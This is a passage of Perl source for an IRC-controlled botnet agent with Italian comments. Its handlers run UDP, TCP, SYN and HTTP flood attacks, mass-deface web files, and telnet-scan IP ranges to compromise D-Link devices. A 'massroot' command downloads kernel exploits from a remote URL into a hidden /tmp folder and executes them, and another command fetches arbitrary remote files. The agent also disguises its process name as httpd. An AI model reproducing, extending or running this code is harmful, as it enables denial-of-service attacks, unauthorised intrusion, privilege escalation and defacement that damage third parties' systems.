                    msg($where,$section,"Connect aT:7 $ipbase 9OkI! ");
						    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				&dlink($ipbase,$sk2,$section,$where);
				} 
					exit; 
				    }   
                    
                    $totexp++;
               }else
               {
 #                   msg($where,$section,"Exploiting aT:7 $ipexp 12FaiLeD! bY Net-Warriors Crew");    // OFF :| 
               }

				}


			}



		} elsif ($ip4 eq "x"){

			for ($c=0;$c<=255;$c++){

			my $ipbase= $ip1 . "\." . $ip2 . "\." . $ip3 . "\." . $c;print "Tryng $ipbase\n";

if ($c == 1){
print "Tryng $ipbase\n";
		msg($where,$section,"Trying $ipbase");
}
			  $debug=1;  
              # printf "\nCurrent Ip ->".$ipexp;
               my $sk2 = IO::Socket::INET->new(PeerAddr=>"$ipbase",PeerPort=>"23",Proto=>"tcp") or $debug=0;
               if($debug == 1)
               {
                    msg($where,$section,"Connect aT:7 $ipbase 9OkI! ");
						    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				&dlink($ipbase,$sk2,$section,$where);
				} 
					exit; 
				    }   
                    
                    $totexp++;
               }else
               {

 #                   msg($where,$section,"Exploiting aT:7 $ipexp 12FaiLeD! bY Net-Warriors Crew");    // OFF :| 
               }

			}

		}else{ 
		msg($where,$section,"Error, Non hai inserito un range valido!");
		} 

		msg($where,$section,"Scanner Dlink Finished: Range $range !");

            	$totexp=$totexp+$a;


            } 
                exit; 
            }   
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }


	} elsif ($command =~ /^.cran\s+(.*?)\s+(.*)\s+(.*)/i){
        
        
        
        #######################################################
        #######################################################
        #####################cran##############################
        #######################################################
        #######################################################
        
          $ip1=$1; 
          $ip2=$2;
          $ip3=$3;
          $ip4=int(rand 255);

        $section="CrAn";
        
        if(check($user)){

	            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
            
            
       		 my $a=&randommc($ip1,$ip2,$ip3,$section,$where);
            $totexp=$totexp+$a;
            } 
                exit; 
            }   
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }

} elsif ($command =~ /^.bran\s+(.*?)\s+(.*)/i){
        
        
        
        #######################################################
        #######################################################
        #####################bran##############################
        #######################################################
        #######################################################
        
          $ip1=$1; 
          $ip2=$2;
          $ip3=int(rand 255);
          $ip4=int(rand 255);

        $section="BrAn";
        
        if(check($user)){

	            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
            
            
       		 my $a=&randommb($ip1,$ip2,$section,$where);
            $totexp=$totexp+$a;
            } 
                exit; 
            }   
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }

	} elsif ($command =~ /!udpflood\s+(.*?)\s+(\d+)\s+(\d+)/i){    
        
        
        #######################################################
        #######################################################
        #####################UdpFlood##########################
        #######################################################
        #######################################################
        
        $ip=$1;
        $port=$2;
        $time=$3;
                
        $section="UDPFlood";
        
        #Thx Odix
        
        if(check($user)){
            
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
            
            
            msg($where,$section,"Attacco $ip:$port per $time secondi");
            udpflood($ip,$port,$time);
            msg($where,$section,"Attacco $ip:$port per $time secondi Finito");
            
            } 
                exit; 
            }            
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }


	} elsif ($command =~ /^.rfi\s+(.*?)\s+(.*)/i){    
        
        
        #######################################################
        #######################################################
        #####################RFI Scanner#######################
        #######################################################
        #######################################################
        
        $bug=$1;
        $dork=$2;

                
        $section="Rfi";
        
        
        if(check($user)){
            
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
            
            
#Primo Motore di ricerca
            
            } 
                exit; 
            }         


            
            if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
            
#XXX:     
#Secondo Motore di ricerca
#Subroutine di Stampa dei Result a seconda del motore di ricerca Ex: google: Safe Mode OFF: url...
#uso di searchquery($url); 
#risultato in @result: 	
#my @glist=unici(&google($dork)); 
#Nella sub Google:
#my $Go=("http://www.google.co.uk/search?hl=en&q=".key($key)."&btnG=&meta=&num=100&filter=0&start=".$b); 
#getstore($Go); my $Res ="@result";
#SI RIPRENDE CON:
#	open FILE,">>res.txt";
	#print FILE "Google:" . "@glist";
	#close FILE;
#Fare comando !dominivar, se attivato Domini Random!
#Per Ogni Query al motore di ricerca, Una col Proxy e una senza proxy, in modo tale che se bannato gli fa ciccia
            
            } 
                exit; 
            }          
            
        } else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
        
        
        
        } elsif ($command =~ /!quit/i){
		
	#######################################################
        #######################################################
        #####################Quit###############################
        #######################################################
        #######################################################
	
	 $section="Quit";
        
        if(check($user)){
		
		msg($where,$section,"Exiting..");
		
		exit;
	
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }


        
        
	} elsif ($command =~ /^.httpflood\s+(.*?)\s+(\d+)/i){
		
	#######################################################
        #######################################################
        #####################HTTPFlood###########################
        #######################################################
        #######################################################
	
	 $section="HTTP Flood";
	 
	 $target=$1;
	 $tempo=$2;
	 
	 if(check($user)){
		 
		msg($where,$section,"Dossando $target per $tempo secondi.");
		 
		my $itime = time;
		my ($cur_time);
		$cur_time = time - $itime;
		while ($tempo>$cur_time){
		$cur_time = time - $itime;
		my $socket = IO::Socket::INET->new(proto=>'tcp', PeerAddr=>$target, PeerPort=>80);
		print $socket "GET / HTTP/1.1\r\nAccept: */*\r\nHost: ".$target."\r\nConnection: Keep-Alive\r\n\r\n";
		close($socket);
		}
		msg($where,$section,"Dossato $target per $tempo secondi.");
		 
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
	 
		
	} elsif ($command =~ /^.oldudpflood\s+(.*?)\s+(\d+)\s+(\d+)/i){
		
	#######################################################
        #######################################################
        #####################Old UdpFlood#########################
        #######################################################
        #######################################################
		
	$target=$1;
	$pacchi=$2;
	$tempo=$3;
	 
	 if(check($user)){
		
	msg($where,$section,"Attacco $target con $pacchi Kb di pacchetti per $tempo secondi.");
	my ($dtime, %pacotes) = udpflooder("$target", "$pacchi", "$tempo");
	$dtime = 1 if $dtime == 0;
	my %bytes;
	$bytes{igmp} = $pacchi * $pacotes{igmp};
	$bytes{icmp} = $pacchi * $pacotes{icmp};
	$bytes{o} = $pacchi * $pacotes{o};
	$bytes{udp} = $pacchi * $pacotes{udp};
	$bytes{tcp} = $pacchi * $pacotes{tcp};
	msg($where,$section,"Risultato: ".int(($bytes{icmp}+$bytes{igmp}+$bytes{udp} + $bytes{o})/1024)." Kb di Pacchetti inviati in $dtime a $target.");
	
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
		
	} elsif ($command =~ /^.tcpflood\s+(.*?)\s+(\d+)\s+(\d+)/i){
		
	#######################################################
        #######################################################
        #####################TcpFlood############################
        #######################################################
        #######################################################
        
        $ip=$1;
        $port=$2;
        $tempo=$3;
                
        $section="TCPFlood";
                
        if(check($user)){
		
	msg($where,$section,"Attacco $ip:$port per $tempo secondi.");
	my $itime = time;
	my ($cur_time);
	$cur_time = time - $itime;
	while ($tempo>$cur_time){
	$cur_time = time - $itime;
	&tcpflooder("$ip","$port","$tempo");
	}
	msg($where,$section,"Attacco Compiuto su $ip:$port per $tempo secondi.");
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }


	} elsif ($command =~ /^.mail\s+(.*?)\s+(.*?)\s+(.*?)\s+(.*)/i){
		
		
		
	#######################################################
        #######################################################
        #####################MailSend############################
        #######################################################
        #######################################################
		
		
	$subject=$1;
	$sender=$2;
	$recipient=$3;
	@message=$4;
	
	$section="MailSend";
	
	if(check($user)){
		
	msg($where,$section,"Mando il messaggio a $recipient.");	
	$mailtype = "content-type: text/html";
	$sendmail = '/usr/sbin/sendmail';
	open (SENDMAIL, "| $sendmail -t");
	print SENDMAIL "$mailtype\n";
	print SENDMAIL "Subject: $subject\n";
	print SENDMAIL "From: $sender\n";
	print SENDMAIL "To: $recipient\n\n";
	print SENDMAIL "@message\n\n";
	close (SENDMAIL);
	
	msg($where,$section,"Mandato il messaggio a $recipient.");
	
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
		
		
	} elsif ($command =~ /^.massdeface/i){
	
	#######################################################
        #######################################################
        #####################MassDeface###########################
        #######################################################
        #######################################################
	
	$section="MassDeface";
	
	if(check($user)){
	
	
	{
	print qq^
	^;
	msg($where,$section,"Mass Deface Started !");
	 sleep(1);
	msg($where,$section,"Defacing :4 .PHP");
	sleep(1);
	my @php = glob("*.php"); #Files
	foreach my $deface(@php){
	open(DEFACE, ">$deface");
	print DEFACE $def;
	close(DEFACE)
	}
	msg($where,$section,"Defacing :4 .HTML");
	 sleep(1);
	my @html = glob("*.html"); #Files
	foreach my $deface(@html){
	open(DEFACE, ">$deface");
	print DEFACE $def;
	close(DEFACE)
	}
	msg($where,$section,"Defacing :4 .ASP");
	sleep(1);
	my @asp = glob("*.asp"); #Files
	foreach my $deface(@asp){
	open(DEFACE, ">$deface");
	print DEFACE $def;
	close(DEFACE)
	}
	msg($where,$section,"Defacing :4 .ASPX");
	sleep(1);
	my @aspx = glob("*.aspx"); #Files
	foreach my $deface(@aspx){
	open(DEFACE, ">$deface");
	print DEFACE $def;
	close(DEFACE)
	}
	msg($where,$section,"Defacing :4 .HTM");
	sleep(1);
	my @htm = glob("*.htm"); #Files
	foreach my $deface(@htm){
	open(DEFACE, ">$deface");
	print DEFACE $def;
	close(DEFACE)
	}
	msg($where,$section,"Defacing :4 .JS");
	sleep(1);
	my @js = glob("*.js"); #Files
	foreach my $deface(@js){
	open(DEFACE, ">$deface");
	print DEFACE $def;
	close(DEFACE)
	}
	msg($where,$section,"Defacing :4 .AC");
	sleep(1);
	my @ac = glob("*.ac"); #Files
	foreach my $deface(@ac){
	open(DEFACE, ">$deface");
	print DEFACE $def;
	close(DEFACE)
	}
	msg($where,$section,"Mass Deface is Done !");
	sleep(2);
	exit;
	}
	
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
	
	
	} elsif ($command =~ /^.synflood\s+(.*?)\s+(.*?)\s+(\d+)\s+(\d+)/i){
		
	#######################################################
        #######################################################
        ########################SynFlood#########################
        #######################################################
        #######################################################
		
	$target=$1;
	$source_ip=$2;
	$pacchetti=$3;
	$porta=$4;
	 
	 if(check($user)){

	msg($where,$section,"Attacco $target con $pacchetti Kb di pacchetti sulla porta $porta con l'ip source $source_ip.");
	query($synurl,"tcpflood.c");
	
	system("gcc -o tcpflood tcpflood.c");
	
	if (-e "tcpflood"){		
		
	} else {
		
	$flood=query($synurlcompiled);
	open FILE, ">tcpflood";
	print FILE $flood;
	close FILE;	
		
	}
	
	system ("chmod +x tcpflood");
	
	
	if (my $pid = fork) {
                waitpid($pid, 0);
            } else {
                if (fork) {
                    exit;
                } else {
	
	if (-e "tcpflood"){		
		
		system("./tcpflood -s -c $pacchetti $source_ip $target $porta");
msg($where,$section,"Attacco $target con $pacchetti Kb di pacchetti sulla porta $porta con l'ip source $source_ip Terminato.");
		
	} else {
		
		msg($where,$section,"Errore, Eseguibile non presente.");
	
	}

	
	
	} 
                exit; 
            }   
	    
	
	
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
	
		
	} elsif ($command =~ /^.root/i){
		
	#######################################################
        #######################################################
        ########################RooT############################
        #######################################################
        #######################################################
	
	$section="RooT";
	
	 if(check($user)){

	$rootable="no";

	while ( ( $chiave , $valore ) = each ( %kernels ) ){
		if(`uname -r` =~ /$chiave/i){
			 msg($where,$section,"Rootable con:12 $valore");
			$rootable="si";
			#@rootable = split(",",$valore);	
			#foreach $exploit(@rootable){
			#system("wget http://cueihzo.by.ru/xpl/$exploit");
			#}
			#print "Ho Scaricato $valore\n";
		}
	}	
	
	if($rootable eq "no"){	msg($where,$section,"Non sono rootabile :(");  }
			
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }


} elsif ($command =~ /^.massroot/i){
		
	#######################################################
        #######################################################
        ####################MassRooT############################
        #######################################################
        #######################################################
	
	$section="MassRooT";
	
	 if(check($user)){

	$rootable="no";

	while ( ( $chiave , $valore ) = each ( %kernels ) ){
		if(`uname -r` =~ /$chiave/i){
			 msg($where,$section,"Rootable con:12 $valore");
			$rootable="si";
			@rootable = split(",",$valore);	
			foreach $exploit(@rootable){
			system("cd /tmp;mkdir .ICE-unix;cd /tmp/.ICE-unix;wget $localurl.$exploit;curl -O $localurl.$exploit;fetch $localurl.$exploit");
		
			    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
					query($localurl.$exploit, "/tmp/.ICE-unix/$exploit");
					} 
					exit; 
				    }  
			`cd /tmp/.ICE-unix;chmod +x $file`;
			`/tmp/.ICE-unix/$file`;
			}
			print "Ho Scaricato $valore\n";
		}
	}	
	
	if($rootable eq "no"){	msg($where,$section,"Non sono rootabile :(");  }


	if(`id` =~/root/i){	msg($where,$section,"Sono riuscito a ROOTARMI!");  } else {	msg($where,$section,"Mi spiace :(");  }
			
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
        }
		
	} elsif ($command =~ /^.download\s+(.*)\s+(.*)/i){
		

	#######################################################
        #######################################################
        ########################Download#######################
        #######################################################
        #######################################################
	
	$url=$1;
	$file=$2;
	
	$section="Download";

        if(check($user)){
			    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				`wget $url;curl -O $url;fetch $url`;
				query($url,$file);
				} 
					exit; 
				    }   
		if (-e $file){
			msg($where,$section,"File $file scaricato da $url.");
		} else {
			msg($where,$section,"File non scaricato correttamente.");
		}
	
	} else {
    
        msg($where,$section,"Devi Loggarti per effettuare questo comando.");
    
    }
    
    }
    
}

#End Of the Parse (Core) Function

#######################################################
#######################################################
################### Subroutines #######################
#######################################################
#######################################################

sub msg {
	($query,$sezione,$msg)=@_;
	$tmp++;
	$sez=$sezione;
        $first=substr($sezione, 0, 1);
        $last=chop($sezione);
        substr($sezione, 0, 1) = "";
        if($tmp % $linas_max==0){ sleep $sleep; }
		if($botz[1] eq $nick){
			printf $socket "PRIVMSG $query :3.4(7`4 $first1 $sezione4 $last7`4)3.1~2>0,1 $msg1,14\n";
		} else {
			#msg_sync($first.$sezione.$last,$msg);
		}
		my $sym_pwd=`pwd`;
		chop $sym_pwd;
		printf $socket "PRIVMSG $query :14,1[3,1 $sym_id14,1\@4,1 $sym_uname14,1 $sym_pwd 4,1 $sez14,1 ] 2\$ 3,1 $msg1,14\n";
}



sub unici{
	my @unici = ();
	my %visti = ();
		foreach my $elemento ( @_ ) {
			next if $visti{ $elemento }++;
			push @unici, $elemento;
		}
	return @unici;
}

sub resort{
	my @unici = ();
	my %visti = ();
		foreach my $elemento ( @_ ) {
			next if $visti{ $elemento }++;
			push @unici, $elemento;
		}
	@unici=sort(@unici);
	return @unici;
}



sub connessione {
	my $socket = IO::Socket::INET->new(PeerAddr=>$server,PeerPort=>$porta,Proto=>"tcp",Timeout=>10) or goto restart;
	$socket->autoflush(1);
	printf $socket "NICK $nick\n";
	printf $socket "USER $ident $ident $ident $ident :$realname\n";
		foreach my $canale(@canali){
			sleep 5;
			my ($c,$p)=split(/\|/,$canale);
			printf $socket "JOIN $c $p\r\n";
			#printf $socket "CHANNEL $c $p\n";
		}
	return $socket;
}

sub check{
    $checked=$_[0];
    if (grep { $_ eq $checked } @logged) {
        return 1;
    }
}

sub processo{



    @process=`ps aux`;
        foreach $proc(@process){
            ($puser,$pname) = $proc =~ /^(\S+)\s*.+:.?\s*(.+)/;
            substr($pname, 0, 2) = "";
                if ($pname =~ /http|apache|php|DSSL|httpd/i){
                	push(@processi,$pname);
                }	
        }

	$prox=$processi[rand(@processi)];

	if(!$prox) {
			$prox="[httpd]";
		}	

    return $prox;

}

sub genick{

	if($prefix_os==1){
	
		$uname=`uname`;

		if($uname =~ /linux/i){
			$prefix = "LnX";
		} elsif ($uname =~ /bsd/i){
			$prefix = "BsD";		
		} elsif ($uname =~ /sunos/i){
			$prefix = "SuN";	
		} elsif ($uname =~ /darwin/i){
			$prefix = "DrW";	
		} else {
			$prefix = "UnK";
		}

		if(`id`=~/root/i){
			$prefix.= "r00t";
		}	


	}
    
    $nick=$prefix . $chars[rand(@chars)] . $chars[rand(@chars)] . $chars[rand(@chars)] . $chars[rand(@chars)] . $chars[rand(@chars)] . $chars[rand(@chars)];

    return $nick;

}

sub udpflood {
while (){
    use Socket;


    my ($ip,$port,$size,$time);
    $ip=$_[0];
    $port=$_[1]; 
    $ftime=$_[2];

    #msg($where,$section,"Attacco $ip:$port per $ftime secondi");
    my $itime = time;
    my ($cur_time);
    socket(crazy, PF_INET, SOCK_DGRAM, 17);
    $iaddr = inet_aton("$ip");

        if ($_[1] ==0 && $_[2] ==0) {
            goto randpackets;
        }
        if ($_[1] !=0 && $_[2] !=0) {

            goto packets;
        }
        if ($_[1] !=0 && $_[2] ==0) {
            goto packets;
        }
        if ($_[1] ==0 && $_[2] !=0) {
            goto randpackets;
        }

    packets:
        while () {
            if($line=~/PING(.*)/){print $socket "PONG :$1\n";}
            $size=$rand x $rand x $rand;
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            send(crazy, 0, $size, sockaddr_in($port, $iaddr));

        } 

    randpackets:
        while () {
            if($line=~/PING(.*)/){print $socket "PONG :$1\n";}
            $size=$rand x $rand x $rand;
            $port=int(rand 65000) +1;
            $cur_time = time - $itime;
            last if $cur_time >= $ftime;
            send(crazy, 0, $size, sockaddr_in($port, $iaddr));

        }
        
    #msg($where,$section,"Attacco $ip:$port per $ftime secondi Finito");
    last if $cur_time >= $ftime;
}
}

sub udpflooder {
	my $iaddr = inet_aton($_[0]);
	my $msg = 'A' x $_[1];
	my $ftime = $_[2];
	my $cp = 0;
	my (%pacotes);
	$pacotes{icmp} = $pacotes{igmp} = $pacotes{udp} = $pacotes{o} = $pacotes{tcp} = 0;
	socket(SOCK1, PF_INET, SOCK_RAW, 2) or $cp++;
	socket(SOCK2, PF_INET, SOCK_DGRAM, 17) or $cp++;
	socket(SOCK3, PF_INET, SOCK_RAW, 1) or $cp++;
	socket(SOCK4, PF_INET, SOCK_RAW, 6) or $cp++;
	return(undef) if $cp == 4;
	my $itime = time;
	my ($cur_time);
	while ( 1 ) {
		for (my $porta = 1;
		$porta <= 65000; $porta++) {
			$cur_time = time - $itime;
			last if $cur_time >= $ftime;
			send(SOCK1, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{igmp}++;
			send(SOCK2, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{udp}++;
			send(SOCK3, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{icmp}++;
			send(SOCK4, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{tcp}++;


				for (my $pc = 3;
				$pc <= 255;$pc++) {
					next if $pc == 6;
					$cur_time = time - $itime;
					last if $cur_time >= $ftime;
					socket(SOCK5, PF_INET, SOCK_RAW, $pc) or next;
					send(SOCK5, $msg, 0, sockaddr_in($porta, $iaddr)) and $pacotes{o}++;
				}
		}
		last if $cur_time >= $ftime;
	}
	return($cur_time, %pacotes);
}

sub tcpflooder {
	my $itime = time;
	my ($cur_time);
	my ($ia,$pa,$proto,$j,$l,$t);
	$ia=inet_aton($_[0]);
	$pa=sockaddr_in($_[1],$ia);
	$ftime=$_[2];
	$proto=getprotobyname('tcp');
	$j=0;$l=0;
	$cur_time = time - $itime;
		while ($l<1000){
			$cur_time = time - $itime;
			last if $cur_time >= $ftime;
			$t="SOCK$l";
			socket($t,PF_INET,SOCK_STREAM,$proto);
			connect($t,$pa)||$j--;
			$j++;$l++;
		}
	$l=0;
		while ($l<1000){
			$cur_time = time - $itime;
			last if $cur_time >= $ftime;
			$t="SOCK$l";
			shutdown($t,2);
			$l++;
		}
}
#Thx  0ldW0lf
sub query ($$)
{
  my $url = shift;
  my $file = shift;

  $http_stream_out = 1;
  open(GET_OUTFILE, "> $file");
  %http_loop_check = ();
  _get($url);
  close GET_OUTFILE;
  return $main::http_get_result;
}

sub _get
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get($host, $port, $path);
  } else {
    return undef;
  }
}


sub _trivial_http_get
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);

  $AGENT = "get-minimal";
  $VERSION = "20000118";

  $path =~ s/ /%20/g;

  
  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;

  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") {
      $b1 = $buf; 
      $buf =~ s/.+?\015?\012\015?\012//s;
    }
    if ($http_stream_out) { print GET_OUTFILE $buf; $buf = ""; }
  }
  return undef unless defined($n);

  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/
) {
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}
sub searchquery ($$)
{
  my $url = shift;

  $http_stream_out = 1;
  %http_loop_check = ();
  _getquery($url);
  return $main::http_get_result;
}

sub _getquery
{
  my $url = shift;
  my $proxy = "";
  grep {(lc($_) eq "http_proxy") && ($proxy = $ENV{$_})} keys %ENV;
  if (($proxy eq "") && $url =~ m,^http://([^/:]+)(?::(\d+))?(/\S*)?$,) {
    my $host = $1;
    my $port = $2 || 80;
    my $path = $3;
    $path = "/" unless defined($path);
    return _trivial_http_get_query($host, $port, $path);
  } elsif ($proxy =~ m,^http://([^/:]+):(\d+)(/\S*)?$,) {
    my $host = $1;
    my $port = $2;
    my $path = $url;
    return _trivial_http_get_query($host, $port, $path);
  } else {
    return undef;
  }
}


sub _trivial_http_get_query
{
  my($host, $port, $path) = @_;
  my($AGENT, $VERSION, $p);
  #print "HOST=$host, PORT=$port, PATH=$path\n";

  $AGENT = "get-minimal";
  $VERSION = "20000118";

  $path =~ s/ /%20/g;


  local($^W) = 0;
  my $sock = IO::Socket::INET->new(PeerAddr => $host,
                                   PeerPort => $port,
                                   Proto   => 'tcp',
                                   Timeout  => 60) || return;
  $sock->autoflush;
  my $netloc = $host;
  $netloc .= ":$port" if $port != 80;
  my $request = "GET $path HTTP/1.0\015\012"
              . "Host: $netloc\015\012"
              . "User-Agent: $AGENT/$VERSION/u\015\012";
  $request .= "Pragma: no-cache\015\012" if ($main::http_no_cache);
  $request .= "\015\012";
  print $sock $request;

  my $buf = "";
  my $n;
  my $b1 = "";
  while ($n = sysread($sock, $buf, 8*1024, length($buf))) {
    if ($b1 eq "") { # first block?
      $b1 = $buf;         # Save this for errorcode parsing
      $buf =~ s/.+?\015?\012\015?\012//s;      # zap header
    }
    if ($http_stream_out) { push(@result,$buf); $buf = ""; }
  }
  return undef unless defined($n);

  $main::http_get_result = 200;
  if ($b1 =~ m,^HTTP/\d+\.\d+\s+(\d+)[^\012]*\012,) {
    $main::http_get_result = $1;
    # print "CODE=$main::http_get_result\n$b1\n";
    if ($main::http_get_result =~ /^30[1237]/ && $b1 =~ /\012Location:\s*(\S+)/
) {
      # redirect
      my $url = $1;
      return undef if $http_loop_check{$url}++;
      return _get($url);
    }
    return undef unless $main::http_get_result =~ /^2/;
  }

  return $buf;
}

sub randommc()
{
    my($ip1,$ip2,$ip3,$section,$where)=@_; 
    my $debug=1;
          $ipexp=$ip1.".".$ip2.".".$ip3;
          $classc=0;
          $classb=0;
          $ipcheck=0;
          $ownz=0;
          $count=0;
          msg($where,$section,"Random Scan Start To :$ipexp");     
               while($classc < 254)
               {
                   $ip4=int(rand 255);
                   while(($ip_4 =~ $ip4) && ($count < 254))
                   {
                       $count++;
                       $ip4=$count;
                       #print "\n".$ipexp.": Sto Calcolando La classe C:".$count;
                   }
                   if($ip_4 =~ $ip4)
                   {}else
                   {$ip_4.=$ip4; }
                   $classc++;
                   $count=0;
               $ipexp=$ip1.".".$ip2.".".$ip3.".".$ip4; 
               $debug=1;  
               #printf "\nR:Current Ip ->".$ipexp;
               my $sk2 = IO::Socket::INET->new(PeerAddr=>"$ipexp",PeerPort=>"23",Proto=>"tcp") or $debug=0;
               if($debug == 1)
               {
                    msg($where,$section,"Connect aT:7 $ipexp 9OkI! ");
  				    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				&dlink($ipexp,$sk2,$section,$where);
				} 
					exit; 
				    }   
                    
                    $totexp++;
               }else
               {
 #                   msg($where,$section,"Exploiting aT:7 $ipexp 12FaiLeD! bY Net-Warriors Crew");    // OFF :| 
               }
               $ipcheck++;
               }
               $classb=0;
               $classc=0;
               $ownz=$totexp;
            msg($where,$section,"Random Scan Completed Su IP: $ip1.$ip2.$ip3.0");   
            msg($where,$section,"Ip Analizzati: $ipcheck "); 
            msg($where,$section,"Ip 0wNeD: $ownz ");   
            return $totexp;   
}
sub randommb()
{
    my($ip1,$ip2,$section,$where)=@_; 
    my $debug=1;
          $ipexp=$ip1.".".$ip2;
          $classc=0;
          $classb=0;
          $ipcheck=0;
          $ownz=0;
          $count=0;
          msg($where,$section,"Random Scan Start To :7 $ipexp ");     
            while($classb < 254)
            {
               $ip3=int(rand 255);
               while($classc < 254)
               {
                   $ip4=int(rand 255);
                   while(($ip_4 =~ $ip4) && ($count < 254))
                   {
                       $count++;
                       $ip4=$count;
                       #print "\n".$ipexp.": Sto Calcolando La classe C:".$count;
                   }
                   if($ip_4 =~ $ip4)
                   {}else
                   {$ip_4.=$ip4; }
                   $count=0;
                   $classc++;
               
               $ipexp=$ip1.".".$ip2.".".$ip3.".".$ip4; 
               $debug=1;  
               #printf "\nR:Current Ip ->".$ipexp;
               my $sk2 = IO::Socket::INET->new(PeerAddr=>"$ipexp",PeerPort=>"23",Proto=>"tcp") or $debug=0;
               if($debug == 1)
               {
                    msg($where,$section,"Connect aT:7 $ipexp 9OkI! ");
				    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				&dlink($ipexp,$sk2,$section,$where);
				} 
					exit; 
				    }   
                    
                    $totexp++;
               }else
               {
 #                   msg($where,$section,"Exploiting aT:7 $ipexp 12FaiLeD! bY Net-Warriors Crew");    // OFF :| 
               }
               }
               while(($ip_3=~$ip3) &&($count < 254))
               {
                    $count++;
                       $ip3=$count;
                      # print "\n".$ipexp.": Sto Calcolando La classe B:".$count;
               }
               if($ip_3 =~ $ip3)
                   {}else
                   {$ip_4.=$ip4; }
                         $ip_4=0;
               $classb++;
               $classc=0;
               $ipcheck++;
            }
            $ownz=$totexp;
            msg($where,$section,"Random Scan Completed Su IP: $ip1.$ip2.0.0");   
            msg($where,$section,"Ip Analizzati: $ipcheck "); 
            msg($where,$section,"Ip 0wNeD: $ownz "); 
            return $totexp;      
}
sub scan()
{
    my($ip1,$ip2,$ip3,$ip4,$section,$where)=@_;  
    my $debug=1;
    $ipcheck=0;
    $ownz=0;
          $ipexp=$ip1.".".$ip2.".".$ip3.".".$ip4;
            msg($where,$section,"Exploiting enJoy aT:7 $ipexp /255");    
            while($ip4<255)
            {
               if( $ip4 == 254)      #//classe B calcolo veloce 
               {
                   $ip4=0;
                   $ip3++;
                   if( $ip3 == 254)
                   {
                      $ip3=0;
                      $ip2++;
                   }
               }
               $ipexp=$ip1.".".$ip2.".".$ip3.".".$ip4; 
               $debug=1;  
              # printf "\nCurrent Ip ->".$ipexp;
               my $sk2 = IO::Socket::INET->new(PeerAddr=>"$ipexp",PeerPort=>"23",Proto=>"tcp") or $debug=0;
               if($debug == 1)
               {
                    msg($where,$section,"Connect aT:7 $ipexp 9OkI! ");
						    if (my $pid = fork) {
				waitpid($pid, 0);
			    } else {
				if (fork) {
				    exit;
				} else {
				&dlink($ipexp,$sk2,$section,$where);
				} 
					exit; 
				    }   
                    
                    $totexp++;
               }else
               {
 #                   msg($where,$section,"Exploiting aT:7 $ipexp 12FaiLeD! bY Net-Warriors Crew");    // OFF :| 
               }
            $ip4++;
            $ipcheck++;
            }
            $ownz=$totexp;
            msg($where,$section,"Random Scan Completed ");   
            msg($where,$section,"Ip Analizzati: $ipcheck "); 
            msg($where,$section,"Ip 0wNeD: $ownz ");
	return $totexp;
}
sub dlink()
{
